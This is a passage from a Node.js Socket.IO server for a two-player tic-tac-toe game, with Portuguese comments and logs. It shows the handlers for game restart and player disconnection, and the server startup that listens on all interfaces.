  
  // Reiniciar jogo
  socket.on('reiniciar', () => {
    board = ['', '', '', '', '', '', '', '', ''];
    vez = 'X';
    io.emit('reiniciar');
    console.log('🔄 Jogo reiniciado');
  });
  
  // Desconexão
  socket.on('disconnect', () => {
    console.log('❌ Cliente desconectado:', socket.id);
    
    if (socket.id === jogadores.x) {
      jogadores.x = null;
      console.log('Jogador X removido');
    }
    if (socket.id === jogadores.o) {
      jogadores.o = null;
      console.log('Jogador O removido');
    }
    
    // Se não houver mais jogadores, resetar o jogo
    if (!jogadores.x && !jogadores.o) {
      board = ['', '', '', '', '', '', '', '', ''];
      vez = 'X';
      console.log('Jogo resetado - sem jogadores');
    }
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('\n🚀 SERVIDOR SUPER ROBUSTO RODANDO!');
  console.log(`   📱 Porta: ${PORT}`);
  console.log(`   🌐 Acesse: http://localhost:${PORT}`);
  console.log(`   📱 No celular: use o IP da sua máquina`);
  console.log(`   🎮 Jogo da velha com vídeo/áudio ao vivo!\n`);
});
